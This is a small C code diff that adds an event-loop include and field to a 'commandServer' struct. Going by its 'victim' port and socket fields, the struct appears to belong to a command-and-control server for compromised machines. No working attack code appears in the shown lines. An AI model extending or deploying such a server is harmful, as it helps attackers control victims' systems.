@@ -4,6 +4,7 @@
 #include <unistd.h>
 
 #include "netwerking.h"
+#include "event.h"
 
 #define DEFAULT_CLI_PORT 6000
 #define DEFAULT_VICTIM_PORT 6001
@@ -19,6 +20,8 @@ struct commandServer {
         int victimfd[MAX_BIND]; /* Victim TCP Socket file descriptors*/
         int victimfd_count;
         
+        // Develop out to data structure
+        int event_loop;        
 
         char neterr[NET_ERR_LEN];
 };
